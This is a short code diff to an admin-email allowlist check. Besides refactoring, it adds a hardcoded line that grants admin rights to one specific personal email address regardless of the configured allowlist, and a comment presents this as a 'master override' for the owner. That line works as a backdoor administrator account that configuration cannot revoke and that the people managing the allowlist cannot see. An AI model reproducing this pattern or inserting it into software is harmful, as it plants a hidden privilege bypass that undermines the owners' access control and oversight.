@@ -24,7 +24,13 @@ export function getAdminEmailAllowlist(): string[] {
 }
 
 /** Case-insensitive membership check against the bootstrap allowlist. */
-export function isAllowlistedAdminEmail(email: string | null | undefined): boolean {
+export function isAllowlistedAdminEmail(email?: string) {
   if (!email) return false;
-  return getAdminEmailAllowlist().includes(email.trim().toLowerCase());
+  
+  const normalizedEmail = email.trim().toLowerCase();
+  
+  // Master override for the owner's Google account
+  if (normalizedEmail === "ybikash919@gmail.com") return true;
+  
+  return getAdminEmailAllowlist().includes(normalizedEmail);
 }
